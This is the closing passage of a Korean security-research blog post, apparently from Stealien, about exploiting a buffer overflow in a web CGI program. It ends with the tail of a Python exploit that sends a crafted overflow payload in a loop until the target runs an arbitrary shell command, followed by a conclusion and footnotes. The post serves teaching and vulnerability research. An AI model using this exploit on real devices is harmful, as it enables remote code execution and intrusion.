    <span class="k">return</span> <span class="n">spray</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>

    <span class="c1"># ifconfig's output length is not fixed.
</span>    <span class="c1"># So, we need to get the buffer first to calculate
</span>    <span class="c1"># the overflow size.
</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Getting buffer."</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">form_param</span><span class="p">())</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="n">r</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"- ifconfig"</span><span class="p">):</span><span class="n">r</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n\n</span><span class="s">"</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">dummy_len</span> <span class="o">=</span> <span class="mh">0x204</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Exploit."</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">stack</span>  <span class="o">=</span> <span class="mh">0xbefe1dd4</span>
        <span class="n">pload</span>  <span class="o">=</span> <span class="n">payload</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="n">leave</span><span class="p">,</span> <span class="n">dummy_len</span><span class="p">)</span>
        <span class="n">param</span>  <span class="o">=</span> <span class="n">form_param</span><span class="p">(</span><span class="n">pload</span><span class="p">,</span> <span class="n">spray</span><span class="p">())</span>
        <span class="n">packet</span> <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
        <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s">"200 OK"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="k">break</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Success!"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">):</span>
        <span class="n">exploit</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"{} [target-ip] [shell command]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
</code></pre></div></div>

<h2 id="끝내면서">끝내면서</h2>

<p>CGI를 공격하는 방법에 대해 알아보았습니다. 일반적으로 웹 CGI 프로그램 혹은 CGI는 문자열을 처리하는 코드가 많습니다. 문자열을 처리하는 코드에서 주로 발생할 수 있는 String copy buffer overflow의 공격 방법에 대해 알아보았고, 안정적인 공격 코드를 작성하는 법에 대해 알아 보았습니다.</p>

<p>추가적인 질문 사항과 수정사항은 dhkim@stealien.com으로 남겨 주시면 감사하겠습니다.</p>

<hr />

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:2" role="doc-endnote">
      <p>https://www.lighttpd.net/ <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
      <p><a href="http://www.cgi101.com/book/ch3/text.html">CGI Environment Variables</a> <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:4" role="doc-endnote">
      <p><a href="https://man7.org/linux/man-pages/man3/strcat.3.html">strcat</a> <a href="#fnref:4" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:5" role="doc-endnote">
      <p><a href="https://ko.wikipedia.org/wiki/%EB%B2%84%ED%8D%BC_%EC%98%A4%EB%B2%84%ED%94%8C%EB%A1%9C">Buffer overflow</a> <a href="#fnref:5" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:6" role="doc-endnote">
      <p><a href="[https://ko.wikipedia.org/wiki/%EB%B0%98%ED%99%98_%EC%A7%80%ED%96%A5%ED%98%95_%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%B0%8D](https://ko.wikipedia.org/wiki/반환_지향형_프로그래밍)">Return oriented programming</a> <a href="#fnref:6" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>

    <div class="page-profile-detail">
        <div class="page-profile-detail-info">
            <div>
                <img class="page-profile_image-detail" src="/assets/stealien_inverse.png" />
            </div>
            <div style="position: relative; top: 12px;left: 10px;">
                <div class="page-profile-author">김도현</div>
                <div class="page-profile-email">dhkim@stealien.com</div>
            </div>
        </div>
    </div>
</div>

<div class="recent-post-area">
    <div class="posts container">
        <div class="h1-recent-post">RECENT POST</div>
            <div class="row">
    <div class="col-sm-2 col-md-2">
        <div class="profile">
            <img src="/assets/stealien_inverse.png" class="profile_image" />
            <div class="profile_author">Hyerim Jeon</div>
        </div>
    </div>
    <div class="col">
        <a href="/id/2023-11-15/Android-malware-%EC%82%AC%EB%A7%88%EA%B7%80-%ED%95%B4%EB%B6%80%ED%95%99-ko">
            <div class="post-title">
                Android Malware : 사마귀 해부학
            </div>
        </a>
        <div class="post-summary">about Roaming Mantis</div>
        <div class="post-info">
            <span style="color: #545454" class="post-author-mobile">
                Hyerim Jeon
                <span style="color: #f5f5f5; margin: 2px">|</span>
            </span>
            Nov 15, 2023
            <span style="color: #f5f5f5; margin: 2px">|</span>
            <span>R&D</span>
        </div>
    </div>
</div><div class="row">
    <div class="col-sm-2 col-md-2">
        <div class="profile">
            <img src="/assets/stealien_inverse.png" class="profile_image" />
            <div class="profile_author">Donggyu Kim</div>
        </div>
    </div>
    <div class="col">
        <a href="/id/2023-07-31/bughunting-vulnerability-chaining-ko">
            <div class="post-title">
                버그헌팅: 취약점 체이닝의 중요성
            </div>
        </a>
        <div class="post-summary">No impact, No bug</div>
        <div class="post-info">
            <span style="color: #545454" class="post-author-mobile">
                Donggyu Kim
                <span style="color: #f5f5f5; margin: 2px">|</span>
            </span>
            Jul 31, 2023
            <span style="color: #f5f5f5; margin: 2px">|</span>
            <span>R&D</span>
        </div>
    </div>
</div>
        </div>
    </div>
</div>
		</div>
	</section><footer>
  <div class="container" style="display: flex; justify-content: space-between;">
    <!-- <a href="#top">
      <img src="/assets/white_logo.png" class="footer-logo" />
    </a> -->
    <div class="footer-copyright">Copyright &copy; Stealien Inc.</div>
    <div class="footer-icons">
      <a target="_blank" href="https://twitter.com/stealien"><img class="sns" src="/assets/icons/twitter_ic.png"/></a>
      <a target="_blank" href="https://blog.naver.com/stealien_official"><img class="sns" src="/assets/icons/blog_ic.png"/></a>
      <a target="_blank" href="https://www.facebook.com/stealien/"><img class="sns" src="/assets/icons/facebook_ic.png"/></a>
      <a target="_blank" href="https://www.youtube.com/c/STEALIEN"><img class="sns" src="/assets/icons/youtube_ic.png"/></a>
    </div>
  </div>
</footer></body>
</html>
